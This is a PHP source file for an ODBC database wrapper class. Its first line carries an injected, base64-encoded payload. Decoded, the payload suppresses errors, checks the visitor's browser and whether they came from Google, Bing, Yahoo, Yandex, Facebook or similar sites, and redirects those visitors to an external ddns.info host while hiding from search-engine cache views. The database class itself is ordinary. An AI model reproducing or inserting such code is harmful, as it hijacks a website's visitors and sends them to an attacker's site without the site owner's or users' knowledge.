<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."db/db.php");
require_once(GENERIC_PATH."utils/utils.php");

class db_odbc extends db {

  function db_odbc($db_server, $db_dsn, $db_user, $db_password) {

    parent::db($db_server, $db_dsn, $db_user, $db_password);

  }

  function connect($db_server, $db_name, $db_user, $db_password) {

    global $log;
    $this->connection = odbc_connect($db_name, $db_user, $db_password);
    if (!$this->connection) {
      $log->error("Can't connect to database $db_server");
      $log->halt("Can't connect to database.");
    }

  }

  function get_last_error() { 

    return odbc_error($this->connection).": ".odbc_errormsg($this->connection); 

  }

  function internal_query($sql) { 

    return @odbc_exec($this->connection, $sql); 

  }

  function internal_count($query) { 

    return abs(odbc_num_rows($query)); 

  }

  function internal_num_row($query) { 

    return odbc_fetch_row($query); 

  }

  function internal_row($query) { 

    return odbc_fetch_array($query); 

  }

  function internal_field_defs($query) {

    $field_defs = array();
    $field_count = odbc_num_fields($query);
    for ($i=1; $i <= $field_count; $i++)
      $field_defs[odbc_field_name($query, $i)] = array( "length" => odbc_field_len($query, $i)
                                                      , "type"   => odbc_field_type($query, $i));
    return $field_defs;

  }

}

?>